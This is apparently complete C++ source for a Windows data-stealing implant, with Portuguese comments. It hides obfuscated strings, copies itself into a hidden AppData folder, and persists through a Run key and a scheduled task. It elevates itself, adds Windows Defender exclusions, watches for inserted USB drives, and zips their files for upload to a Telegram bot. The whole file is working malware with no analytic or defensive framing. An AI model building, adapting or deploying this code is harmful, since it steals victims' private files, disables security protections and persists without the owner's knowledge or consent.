// language: C++20, file: lichia_native.cpp, target: Windows 11, MSVC
// Watcher nativo sem assinaturas de interpretador: instala, persiste,
// vigia drives removiveis, copia, empacota (ZIP stored + CRC32 proprio) e
// envia ao Telegram via WinHTTP. Strings sensiveis com XOR posicional.
#include <windows.h>
#include <winhttp.h>
#include <shellapi.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <algorithm>
#include <cstdint>
#include <cctype>
#include <cwctype>
#include <cstdio>
#include <cstdlib>

namespace fs = std::filesystem;

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")


static std::string XD(const unsigned char* p, size_t n) {
    std::string s(n, '\0');
    for (size_t i = 0; i < n; ++i)
        s[i] = char(p[i] ^ 0x5A ^ ((i * 167u + 11u) & 0xFF));
    return s;
}
#define XDS(a) XD(a, sizeof(a) - 1)

static const unsigned char ENC_HOST[] =
    "\x30""\x98""\x6A""\x74""\x89""\x71""\xC3""\xA3""\x7E""\xC2""\xAA""\x0F""\xAB""\xB3""\x05""\xE9";
static const unsigned char ENC_DOC[] =
    "\x7E""\x9B""\x66""\x34""\x99""\x50""\xC0""\xA5""\x6C""\xDD""\xAE""\x0C""\xF1";
static const unsigned char ENC_MSG[] =
    "\x7E""\x9B""\x66""\x34""\x99""\x59""\xCA""\xB5""\x6A""\xD1""\xAC""\x07";
static const unsigned char ENC_NAME[] =
    "\x1D""\x81""\x60""\x32""\x94""\x75";
static const unsigned char ENC_EXE[] =
    "\x1C""\x81""\x60""\x28""\x92""\x67""\xC0""\xA0""\x6D""\xE3""\xB2""\x0C""\xE6""\x94""\x18""\xFD""\x55""\x56""\xF6""\x52""\x28";
static const unsigned char ENC_CFG[] =
    "\x3D""\x81""\x60""\x32""\x98""\x7A""\x81""\xA5""\x76""\xDE""\xAD""\x0B""\xE2";
static const unsigned char ENC_CACHE[] =
    "\x32""\x89""\x60""\x32""\x98";
static const unsigned char ENC_RUNPATH[] =
    "\x02""\x87""\x65""\x2E""\x8A""\x75""\xDD""\xA3""\x45""\xFD""\xA2""\x01""\xF7""\xB3""\x04""\xE1""\x47""\x0C""\xCF""\x7D""\x24""\x8A""\x5B""\x39""\x9E""\x73""\x07""\xB1""\x60""\xDE""\xB5""\x7B""\xDF""\xBC""\x35""\xDF""\xAF""\x07""\xE6""\x49""\x17""\xCC""\x79""\x37""\x8B";
static const unsigned char ENC_SCH[] =
    "\x12""\xD2""\x5F""\x0D""\x94""\x7A""\xCB""\xA9""\x6E""\xC3""\x97""\x31""\xFC""\xAF""\x03""\xEB""\x4C""\x4B""\xA1""\x76""\x3E""\x87""\x57""\x22""\x88""\x73""\x30""\x81""\x3B""\xC9""\xBF""\x7B";
static const unsigned char ENC_ARGPRE[] =
    "\x7E""\xAB""\x71""\x3F""\x9C""\x60""\xCA""\xE6""\x36""\xF6""\xEB""\x4D""\xD6""\x9F""\x57""\xC1""\x6F""\x34""\xDC""\x6D""\x02""\xAA""\x1F""\x79""\xBD""\x4E""\x7B";
static const unsigned char ENC_ARGMID[] =
    "\x71""\xC7""\x57""\x08""\xDD""\x36""\xF3""\x9A""\x3B";
static const unsigned char ENC_ARGEND[] =
    "\x73""\xC8""\x2E""\x77""\x8A""\x75""\xDB""\xA5""\x71""\x92";
static const unsigned char ENC_RUNAS[] =
    "\x23""\x9D""\x6D""\x3B""\x8E";
static const unsigned char ENC_PS0[] =
    "\x21""\x87""\x74""\x3F""\x8F""\x67""\xC7""\xA3""\x75""\xDC""\xE5""\x07""\xFD""\xB9""\x57""\xA3""\x6F""\x17""\xC3""\x58""\x22""\x82""\x56""\x3A""\x8C""\x20""\x76""\xA5""\x7C""\xC2""\xA3""\x71""\xC6""\x9B""\x17""\xC3""\xB1""\x11""\xAF""\x6E""\x10""\xF4""\x4F""\x27""\x8B""\x1C""\x7A""\xAD""\x6E""\x35""\x9E""\x6B""\xC3""\xA0""\x3F";
static const unsigned char ENC_ADDMP[] =
    "\x10""\x8C""\x67""\x77""\xB0""\x64""\xFF""\xB4""\x7C""\xD6""\xAE""\x10""\xE0""\xB2""\x14""\xEB""\x01""\x55""\xD6""\x52""\x2E""\x88""\x4A""\x25""\x80""\x6F""\x35""\xA2""\x74""\xD8""\xAF""\x3E""\x96";
static const unsigned char ENC_DEFKEY[] =
    "\x02""\xA7""\x45""\x0E""\xAA""\x55""\xFD""\x83""\x45""\xFD""\xA2""\x01""\xF7""\xB3""\x04""\xE1""\x47""\x0C""\xCF""\x7D""\x24""\x8A""\x5B""\x39""\x9E""\x73""\x7B""\xB6""\x70""\xCA""\xA2""\x70""\xD5""\xAD""\x11""\xE6""\x98""\x0C""\xEC""\x4A""\x0C""\xE3""\x42""\x2D""\x8B""\x4F""\x0B""\xBE""\x60""\x2C""\x9B""\x79";
static const unsigned char ENC_SVI[] =
    "\x02""\x91""\x70""\x2E""\x98""\x79""\x8F""\x90""\x76""\xDC""\xBE""\x0F""\xE0""\xFC""\x3E""\xE0""\x47""\x17""\xE1""\x47""\x2C""\x90""\x56""\x39""\x87";
static const unsigned char ENC_RECY[] =
    "\x75""\xBA""\x46""\x19""\xA4""\x57""\xE3""\x83""\x37""\xF2""\x82""\x2C";
static const unsigned char ENC_BOOT[] =
    "\x33""\x87""\x6C""\x2E""\x8E""\x60""\xDD""\xA7""\x69""\x9E""\xA9""\x03""\xF1";
static const unsigned char ENC_AUTO[] =
    "\x30""\x9D""\x77""\x35""\x8F""\x61""\xC1""\xE8""\x70""\xDE""\xAD";
static const unsigned char ENC_LPAY[] =
    "\x1D""\x81""\x60""\x32""\x94""\x75""\xFF""\xA7""\x60""\xDC""\xA4""\x03""\xE1""\xF2""\x12""\xF6""\x44";
static const unsigned char ENC_LNAT[] =
    "\x1D""\x81""\x60""\x32""\x94""\x75""\xE1""\xA7""\x6D""\xD9""\xBD""\x07""\xAB""\xB9""\x0F""\xEB";
static const unsigned char ENC_ZIP[] =
    "\x3D""\x81""\x60""\x32""\x98""\x7A""\x81""\xBC""\x70""\xC0";
static const unsigned char ENC_PART[] =
    "\x3D""\x81""\x60""\x32""\x98""\x7A""\x81""\xB6""\x78""\xC2""\xBF";
static const unsigned char ENC_TXT[] =
    "\x3D""\x81""\x60""\x32""\x94""\x75""\x95""\xE6";
static const unsigned char ENC_KTOK[] =
    "\x25""\x87""\x68""\x3F""\x93";
static const unsigned char ENC_KCHAT[] =
    "\x32""\x80""\x62""\x2E""\xA2""\x7D""\xCB";
static const unsigned char ENC_KMOD[] =
    "\x3C""\x87""\x67""\x35";
static const unsigned char ENC_KMAX[] =
    "\x3C""\x89""\x7B""\x05""\x90""\x76";


static std::wstring Widen(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(),
                                nullptr, 0);
    std::wstring w((size_t)n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}


static std::string Narrow(const fs::path& p) {
    auto u8 = p.u8string();
    return std::string(reinterpret_cast<const char*>(u8.data()), u8.size());
}


static std::wstring AppData() {
    wchar_t buf[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", buf, MAX_PATH);
    return buf;
}

static fs::path StageDir() {
    return fs::path(AppData()) / L"Microsoft" / Widen(XDS(ENC_NAME));
}
static fs::path StageExe() { return StageDir() / Widen(XDS(ENC_EXE)); }
static fs::path StageCfg() { return StageDir() / Widen(XDS(ENC_CFG)); }
static fs::path CacheDir() { return StageDir() / Widen(XDS(ENC_CACHE)); }


static void Hide(const fs::path& p) {
    SetFileAttributesW(p.c_str(),
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}


static void RunHidden(const std::wstring& exe, const std::wstring& args) {
    std::wstring cmd = L"\"" + exe + L"\" " + args;
    STARTUPINFOW si{}; si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                   CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
}


static std::string JsonVal(const std::string& j, const std::string& key) {
    std::string pat = "\"" + key + "\"";
    auto p = j.find(pat);
    if (p == std::string::npos) return "";
    p = j.find(':', p + pat.size());
    if (p == std::string::npos) return "";
    ++p;
    while (p < j.size() && std::isspace((unsigned char)j[p])) ++p;
    if (p >= j.size()) return "";
    if (j[p] == '"') {
        auto e = j.find('"', p + 1);
        return e == std::string::npos ? "" : j.substr(p + 1, e - p - 1);
    }
    auto e = p;
    while (e < j.size() && (std::isdigit((unsigned char)j[e]) ||
                            j[e] == '-' || j[e] == '.')) ++e;
    return j.substr(p, e - p);
}


struct Cfg {
    std::string token, chat, modo, max_mb;
    bool Ok() const { return !token.empty() && !chat.empty(); }
    bool Docs() const { return modo == "docs"; }
    std::uint64_t MaxBytes() const {
        std::uint64_t v = 0;
        for (char c : max_mb) if (std::isdigit((unsigned char)c))
            v = v * 10 + (c - '0');
        return (v ? v : 200) * 1024ull * 1024ull;
    }
};


static Cfg ReadCfg() {
    Cfg c;
    std::ifstream f(StageCfg(), std::ios::binary);
    if (!f) return c;
    std::string j((std::istreambuf_iterator<char>(f)),
                  std::istreambuf_iterator<char>());
    c.token  = JsonVal(j, XDS(ENC_KTOK));
    c.chat   = JsonVal(j, XDS(ENC_KCHAT));
    c.modo   = JsonVal(j, XDS(ENC_KMOD));
    c.max_mb = JsonVal(j, XDS(ENC_KMAX));
    return c;
}


static std::uint32_t Crc32File(const fs::path& p, std::uint64_t* sizeOut) {
    static std::uint32_t table[256];
    static bool built = false;
    if (!built) {
        for (std::uint32_t i = 0; i < 256; ++i) {
            std::uint32_t c = i;
            for (int k = 0; k < 8; ++k)
                c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
            table[i] = c;
        }
        built = true;
    }
    std::uint32_t crc = 0xFFFFFFFFu;
    std::uint64_t size = 0;
    std::ifstream f(p, std::ios::binary);
    char buf[65536];
    while (f.read(buf, sizeof buf) || f.gcount()) {
        std::streamsize n = f.gcount();
        if (n <= 0) break;
        size += (std::uint64_t)n;
        for (std::streamsize i = 0; i < n; ++i)
            crc = table[(crc ^ (unsigned char)buf[i]) & 0xFF] ^ (crc >> 8);
    }
    if (sizeOut) *sizeOut = size;
    return ~crc;
}


static void WriteZip(const fs::path& fromDir, const fs::path& zipPath) {
    std::ofstream z(zipPath, std::ios::binary);
    struct CD { std::string name; std::uint32_t crc, size, off; };
    std::vector<CD> cds;

    std::vector<fs::path> files;
    for (auto& e : fs::recursive_directory_iterator(
             fromDir, fs::directory_options::skip_permission_denied))
        if (e.is_regular_file()) files.push_back(e.path());

    for (auto& p : files) {
        std::string name = Narrow(fs::relative(p, fromDir));
        std::uint64_t size = 0;
        std::uint32_t crc = Crc32File(p, &size);

        std::vector<std::uint8_t> h;
        auto u16 = [&](std::uint16_t v) {
            h.push_back(v & 0xFF); h.push_back(v >> 8);
        };
        auto u32 = [&](std::uint32_t v) {
            for (int i = 0; i < 4; ++i)
                h.push_back((v >> (8 * i)) & 0xFF);
        };

        CD cd{name, crc, (std::uint32_t)size, (std::uint32_t)z.tellp()};
        u32(0x04034B50); u16(20); u16(0); u16(0);
        u16(0); u16(0x2821);
        u32(crc); u32((std::uint32_t)size); u32((std::uint32_t)size);
        u16((std::uint16_t)name.size()); u16(0);
        z.write((const char*)h.data(), (std::streamsize)h.size());
        z.write(name.data(), (std::streamsize)name.size());

        std::ifstream in(p, std::ios::binary);
        char buf[65536];
        while (in.read(buf, sizeof buf) || in.gcount()) {
            std::streamsize n = in.gcount();
            if (n <= 0) break;
            z.write(buf, n);
        }
        cds.push_back(cd);
    }


    std::uint32_t cdStart = (std::uint32_t)z.tellp();
    for (auto& c : cds) {
        std::vector<std::uint8_t> r;
        auto u16 = [&](std::uint16_t v) {
            r.push_back(v & 0xFF); r.push_back(v >> 8);
        };
        auto u32 = [&](std::uint32_t v) {
            for (int i = 0; i < 4; ++i)
                r.push_back((v >> (8 * i)) & 0xFF);
        };
        u32(0x02014B50); u16(20); u16(20); u16(0); u16(0);
        u16(0); u16(0x2821);
        u32(c.crc); u32(c.size); u32(c.size);
        u16((std::uint16_t)c.name.size()); u16(0); u16(0);
        u16(0); u16(0); u32(0);
        u32(c.off);
        z.write((const char*)r.data(), (std::streamsize)r.size());
        z.write(c.name.data(), (std::streamsize)c.name.size());
    }

    std::uint32_t cdEnd = (std::uint32_t)z.tellp();
    std::vector<std::uint8_t> eo;
    auto u16e = [&](std::uint16_t v) {
        eo.push_back(v & 0xFF); eo.push_back(v >> 8);
    };
    auto u32e = [&](std::uint32_t v) {
        for (int i = 0; i < 4; ++i)
            eo.push_back((v >> (8 * i)) & 0xFF);
    };
    u32e(0x06054B50); u16e(0); u16e(0); u16e((std::uint16_t)cds.size());
    u16e((std::uint16_t)cds.size()); u32e(cdEnd - cdStart);
    u32e(cdStart); u16e(0);
    z.write((const char*)eo.data(), (std::streamsize)eo.size());
}


static bool HttpPost(const std::string& path,
                     const std::string& contentType,
                     const std::string& body) {
    HINTERNET h = WinHttpOpen(L"sm", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME,
                              WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h) return false;
    HINTERNET c = WinHttpConnect(
        h, Widen(XDS(ENC_HOST)).c_str(),
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    bool ok = false;
    if (c) {
        HINTERNET r = WinHttpOpenRequest(
            c, L"POST", Widen(path).c_str(), nullptr,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (r) {
            std::wstring whead = Widen("Content-Type: " + contentType + "\r\n");
            ok = WinHttpSendRequest(r, whead.c_str(), (DWORD)whead.size(),
                                    (LPVOID)body.data(), (DWORD)body.size(),
                                    (DWORD)body.size(), 0) &&
                 WinHttpReceiveResponse(r, nullptr);
            if (ok) {
                DWORD status = 0, sz = sizeof status;
                WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE |
                                        WINHTTP_QUERY_FLAG_NUMBER,
                                    WINHTTP_HEADER_NAME_BY_INDEX,
                                    &status, &sz,
                                    WINHTTP_NO_HEADER_INDEX);
                ok = status >= 200 && status < 300;
            }
            WinHttpCloseHandle(r);
        }
        WinHttpCloseHandle(c);
    }
    WinHttpCloseHandle(h);
    return ok;
}


static std::string UrlEnc(const std::string& s) {
    static const char* hex = "0123456789ABCDEF";
    std::string o;
    for (char c : s) {
        unsigned char uc = (unsigned char)c;
        if (std::isalnum(uc) || uc == '-' || uc == '_' || uc == '.' ||
            uc == '~') {
            o += c;
        } else {
            o += '%';
            o += hex[uc >> 4];
            o += hex[uc & 15];
        }
    }
    return o;
}


static bool SendText(const std::string& token, const std::string& chat,
                     const std::string& text) {
    std::string path = "/bot" + token + XDS(ENC_MSG);
    std::string body = "chat_id=" + UrlEnc(chat) +
                       "&text=" + UrlEnc(text);
    return HttpPost(path, "application/x-www-form-urlencoded", body);
}


static bool SendDocument(const std::string& token, const std::string& chat,
                         const fs::path& file, const std::string& caption) {
    std::ifstream in(file, std::ios::binary);
    if (!in) return false;
    std::string data((std::istreambuf_iterator<char>(in)),
                     std::istreambuf_iterator<char>());

    std::string b = "----";
    for (int i = 0; i < 24; ++i)
        b += "0123456789abcdef"[rand() % 16];

    std::string doc = XDS(ENC_DOC);
    std::string path = "/bot" + token + doc;

    std::string body;
    body += "--" + b +
            "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
            chat + "\r\n";
    if (!caption.empty())
        body += "--" + b +
                "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" +
                caption + "\r\n";
    body += "--" + b +
            "\r\nContent-Disposition: form-data; name=\"document\"; \""
            "filename=\"" +
            Narrow(file.filename()) +
            "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
    body += data;
    body += "\r\n--" + b + "--\r\n";

    return HttpPost(path, "multipart/form-data; boundary=" + b, body);
}


static void SendChunked(const std::string& token, const std::string& chat,
                        const fs::path& zip) {
    const std::uint64_t LIM = 49ull * 1024 * 1024;
    std::error_code ec;
    std::uint64_t size = fs::file_size(zip, ec);
    if (ec) return;
    int parts = (int)((size + LIM - 1) / LIM);
    std::ifstream in(zip, std::ios::binary);
    for (int i = 1; i <= parts; ++i) {
        std::uint64_t take = size - (i - 1) * LIM;
        if (take > LIM) take = LIM;
        std::string buf((size_t)take, 0);
        in.read(buf.data(), (std::streamsize)take);
        fs::path tmp = StageDir() /
                       (Widen(XDS(ENC_PART)) + std::to_wstring(i) + L".zip");
        std::ofstream o(tmp, std::ios::binary);
        if (!o) return;
        o.write(buf.data(), (std::streamsize)take);
        o.close();
        SendDocument(token, chat, tmp,
                     "parte " + std::to_string(i) + "/" +
                         std::to_string(parts) + " — " +
                         Narrow(zip.filename()));
        fs::remove(tmp, ec);
    }
}


static bool SkippedName(const std::wstring& n) {
    static const std::wstring skip[] = {
        Widen(XDS(ENC_SVI)),  Widen(XDS(ENC_RECY)),
        Widen(XDS(ENC_NAME)), Widen(XDS(ENC_CFG)),
        Widen(XDS(ENC_BOOT)), Widen(XDS(ENC_AUTO)),
        Widen(XDS(ENC_LPAY)), Widen(XDS(ENC_LNAT)),
    };
    for (const auto& s : skip)
        if (n == s) return true;
    return false;
}


static bool DocExt(const std::wstring& ext) {
    std::wstring e = ext;
    std::transform(e.begin(), e.end(), e.begin(), ::towlower);
    static const wchar_t* docs[] = {
        L".pdf", L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
        L".txt", L".csv", L".jpg", L".jpeg", L".png",
        L".zip", L".rar", L".7z",
    };
    for (auto* d : docs) if (e == d) return true;
    return false;
}


static void Exfil(const std::wstring& rootW) {
    Sleep(4000);
    try {
        Cfg cfg = ReadCfg();
        if (!cfg.Ok()) return;

        fs::path root(rootW);
        if (fs::exists(root / Widen(XDS(ENC_NAME))) ||
            fs::exists(root / Widen(XDS(ENC_CFG))))
            return;

        std::error_code ec;
        fs::remove_all(CacheDir(), ec);
        fs::create_directories(CacheDir(), ec);

        std::uint64_t maxB = cfg.MaxBytes();
        int copied = 0;
        for (auto it = fs::recursive_directory_iterator(
                 root, fs::directory_options::skip_permission_denied);
             it != fs::recursive_directory_iterator(); ++it) {
            fs::path p = it->path();
            if (SkippedName(p.filename().wstring())) {
                it.disable_recursion_pending();
                continue;
            }
            std::error_code fe;
            if (!it->is_regular_file(fe) || fe) continue;
            try {
                if (fs::file_size(p, fe) > maxB || fe) continue;
                if (cfg.Docs() && !DocExt(p.extension().wstring())) continue;
                fs::path dst = CacheDir() / fs::relative(p, root);
                fs::create_directories(dst.parent_path());
                fs::copy_file(p, dst, fs::copy_options::overwrite_existing, fe);
                if (!fe) ++copied;
            } catch (...) {}
        }

        if (!copied) {
            fs::remove_all(CacheDir(), ec);
            return;
        }


        fs::path zip = StageDir() / Widen(XDS(ENC_ZIP));
        fs::remove(zip, ec);
        WriteZip(CacheDir(), zip);

        std::uint64_t total = 0;
        for (auto it = fs::recursive_directory_iterator(
                 CacheDir(), fs::directory_options::skip_permission_denied);
             it != fs::recursive_directory_iterator(); ++it) {
            std::error_code fe;
            if (it->is_regular_file(fe) && !fe)
                total += fs::file_size(it->path(), fe);
        }
        char mb[64]{};
        snprintf(mb, sizeof mb, "%.1f", total / (1024.0 * 1024.0));

        SendText(cfg.token, cfg.chat,
                 XDS(ENC_TXT) + std::to_string(copied) + " arquivos de " +
                     std::string(rootW.begin(), rootW.end()) + " — " +
                     mb + " MB");

        if (fs::file_size(zip) <= 49ull * 1024 * 1024)
            SendDocument(cfg.token, cfg.chat, zip, "");
        else
            SendChunked(cfg.token, cfg.chat, zip);

        fs::remove_all(CacheDir(), ec);
        fs::remove(zip, ec);
    } catch (...) {}
}


static bool IsAdmin() {
    BOOL ok = FALSE;
    PSID group = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &group)) {
        CheckTokenMembership(nullptr, group, &ok);
        FreeSid(group);
    }
    return ok != FALSE;
}


static std::wstring RawArgs() {
    std::wstring cl = GetCommandLineW();
    bool q = !cl.empty() && cl[0] == L'"';
    size_t i = q ? cl.find(L'"', 1) + 1 : cl.find(L' ');
    if (i == std::wstring::npos) return L"";
    while (i < cl.size() && cl[i] == L' ') ++i;
    return cl.substr(i);
}


static bool ElevateSelf() {
    wchar_t buf[MAX_PATH]{};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    std::wstring args = RawArgs();
    std::wstring verb = Widen(XDS(ENC_RUNAS));
    SHELLEXECUTEINFOW sei{};
    sei.cbSize = sizeof sei;
    sei.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = verb.c_str();
    sei.lpFile = buf;
    sei.lpParameters = args.c_str();
    sei.nShow = SW_HIDE;
    return ShellExecuteExW(&sei) != FALSE;
}


static void RunShell(const std::wstring& script) {
    std::wstring cmd = Widen(XDS(ENC_PS0)) + script;
    STARTUPINFOW si{}; si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::vector<wchar_t> mut(cmd.begin(), cmd.end());
    mut.push_back(L'\0');
    if (!CreateProcessW(nullptr, mut.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return;
    WaitForSingleObject(pi.hProcess, 20000);
    CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
}


static void AddExclusion(const std::wstring& path) {
    HKEY k;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, Widen(XDS(ENC_DEFKEY)).c_str(),
                        0, nullptr, 0, KEY_SET_VALUE, nullptr, &k,
                        nullptr) != ERROR_SUCCESS) {
        RunShell(Widen(XDS(ENC_ADDMP)) + path + L"'");
        return;
    }
    DWORD z = 0;
    RegSetValueExW(k, path.c_str(), 0, REG_DWORD, (const BYTE*)&z,
                   sizeof z);
    RegCloseKey(k);
}


static void Shield(const std::wstring& driveRoot) {
    if (!IsAdmin()) return;
    wchar_t up[MAX_PATH]{};
    GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
    AddExclusion(StageDir().wstring());
    AddExclusion(driveRoot + Widen(XDS(ENC_NAME)));
    AddExclusion(std::wstring(up) + L"\\Downloads");
}


static void Persist() {
    std::wstring args = Widen(XDS(ENC_ARGPRE)) + Widen(XDS(ENC_NAME)) +
                        Widen(XDS(ENC_ARGMID)) + StageExe().wstring() +
                        Widen(XDS(ENC_ARGEND));
    RunHidden(Widen(XDS(ENC_SCH)), args);

    HKEY k;
    LONG r = RegOpenKeyExW(HKEY_CURRENT_USER,
                           Widen(XDS(ENC_RUNPATH)).c_str(),
                           0, KEY_SET_VALUE, &k);
    if (r == ERROR_SUCCESS) {
        std::wstring v = L"\"" + StageExe().wstring() + L"\" --watch";
        RegSetValueExW(k, Widen(XDS(ENC_NAME)).c_str(), 0, REG_SZ,
                       (const BYTE*)v.c_str(),
                       (DWORD)((v.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(k);
    }
}


static void Install() {
    wchar_t buf[MAX_PATH]{};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    std::wstring self(buf);

    std::wstring origin = self.substr(0, 3);
    fs::path cfg = fs::path(origin) / Widen(XDS(ENC_NAME)) /
                   Widen(XDS(ENC_CFG));
    if (!fs::exists(cfg))
        cfg = fs::path(origin) / Widen(XDS(ENC_CFG));
    if (!fs::exists(cfg)) return;

    Shield(self.substr(0, 3));

    std::error_code ec;
    fs::create_directories(StageDir(), ec);
    fs::copy_file(self, StageExe(), fs::copy_options::overwrite_existing, ec);
    if (ec) return;
    fs::copy_file(cfg, StageCfg(), fs::copy_options::overwrite_existing, ec);
    Hide(StageDir());
    Hide(StageExe());
    Hide(StageCfg());
    Persist();

    if (fs::exists(StageExe()))
        RunHidden(StageExe().wstring(), L"--watch");
}


static void WatchLoop() {
    fs::path self = StageExe();
    (void)self;
    DWORD known = 0;
    for (int i = 0; i < 26; ++i) {
        wchar_t root[4] = {wchar_t(L'A' + i), L':', L'\\', 0};
        if (GetDriveTypeW(root) == DRIVE_REMOVABLE) known |= (1u << i);
    }
    for (;;) {
        DWORD now = 0;
        for (int i = 0; i < 26; ++i) {
            wchar_t root[4] = {wchar_t(L'A' + i), L':', L'\\', 0};
            if (GetDriveTypeW(root) == DRIVE_REMOVABLE) now |= (1u << i);
        }
        DWORD fresh = now & ~known;
        known = now;
        if (fresh) {
            for (int i = 0; i < 26; ++i) {
                if (fresh & (1u << i)) {
                    std::wstring root{wchar_t(L'A' + i), L':', L'\\'};
                    std::thread(Exfil, root).detach();
                }
            }
        }
        Sleep(3000);
    }
}


int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    srand(GetTickCount());
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    bool install = false, watch = false;
    for (int i = 1; i < argc; ++i) {
        if (!lstrcmpW(argv[i], L"--install")) install = true;
        if (!lstrcmpW(argv[i], L"--watch")) watch = true;
    }
    if (argc <= 1) install = fs::exists(StageExe());

    if (install) {
        if (!IsAdmin() && ElevateSelf()) return 0;
        Install();
    } else if (watch) {
        Hide(StageDir());
        WatchLoop();
    }
    if (argv) LocalFree(argv);
    return 0;
}
